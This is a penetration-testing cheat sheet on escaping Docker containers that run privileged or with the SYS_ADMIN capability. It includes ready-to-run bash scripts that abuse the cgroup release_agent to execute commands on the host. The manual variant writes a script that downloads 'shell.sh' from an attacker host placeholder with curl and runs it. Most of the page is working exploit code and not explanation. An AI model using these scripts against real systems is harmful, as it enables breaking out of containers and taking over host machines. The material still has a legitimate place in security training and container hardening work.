# Docker Escape

## Privileged Docker

### `--privileged` flag

{% tabs %}
{% tab title="PoC" %}
```bash
docker run --rm -it --privileged ubuntu bash
```
{% endtab %}

{% tab title="Verification" %}
For this attack, we need:

* Be **root**.
* Verify that the **Docker** is in **privileged mode** (`--privileged`). To verify this, we can do:

```bash
# Method 1 (It is privileged if the result is greater than 0):
fdisk -l 2>/dev/null | wc -l
# Method 2:
ip link add dummy0 type dummy >/dev/null && echo "[+] Privileged"
ip link delete dummy0 >/dev/null # Clean Up
# Method 3:
https://github.com/stealthcopter/deepce
```
{% endtab %}

{% tab title="Exploit" %}
This capability allows us to do multiple things but let's focus on the ability given to us through "**sys\_admin**" to be able to mount files from the host operating system into the container:

```bash
#!/bin/bash

while true; do
  echo -n "host > "
  read cmd
  d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
  if [ -S "$d" ]; then
    printError "Error: exploit failed (docker too old?)"
    return
  fi
  mkdir -p "$d/w"
  echo 1 >"$d/w/notify_on_release"
  t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
  touch /o
  echo "$t/c" >"$d/release_agent"
  printf "#!/bin/bash\n%s > %s/o" "$cmd" "$t">/c
  chmod +x /c
  sh -c "echo 0 >$d/w/cgroup.procs"
  sleep 1
  cat /o
  rm /c /o
done
```

{% embed url="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes" %}
{% endtab %}
{% endtabs %}

### `SYS_ADMIN`, `security-opt` and `apparmor` flags

{% tabs %}
{% tab title="PoC" %}
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
{% endtab %}

{% tab title="Verification" %}
For this attack, we need:

* We must be running as **root inside the container**.
* The container must be run with the **SYS\_ADMIN** Linux capability (this allows us to use the `mount` command)
* The container must lack an **AppArmor profile**, or otherwise allow the `mount` syscall.
* The cgroup v1 virtual filesystem must be mounted read-write inside the container.

To verify if we can call the mount command, we can use the capsh binary, but if it does not exist, we can try mounting a drive on the system and see if it allows us:

```bash
# Method 1:
capsh --print | grep sys_admin
# Method 2:
mount
mount /mnt/xvda1 /mnt/host
```


{% endtab %}

{% tab title="Exploit" %}
### Automatic

```bash
#!/bin/bash                                                                                        │~
                                                                                                   │~
while true; do                                                                                     │~
  echo -n "host > "                                                                                │~
  read cmd                                                                                         │~
  mkdir /tmp/cgrp 2>/dev/null ; mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null ; mkdir /tmp/c│~
grp/x 2>/dev/null                                                                                  │~
  echo 1 > /tmp/cgrp/x/notify_on_release                                                           │~
  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`                                      │~
  echo "$host_path/c" > /tmp/cgrp/release_agent                                                    │~
  touch /o                                                                                         │~
  printf "#!/bin/bash\n%s > %s/o" "$cmd" "$host_path" > /c                                         │~
  chmod +x /c                                                                                      │~
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"                                                     │~
  sleep 1                                                                                          │~
  cat /o                                                                                           │~
  rm /c /o                                                                                         │~
done
```

### Manual

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /exploit
#echo "chmod +s /bin/sh" >> /exploit
echo "curl http://<LHOST>/shell.sh -o /tmp/shell.sh" >> /exploit
echo "bash /tmp/shell.sh" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% endtab %}
{% endtabs %}
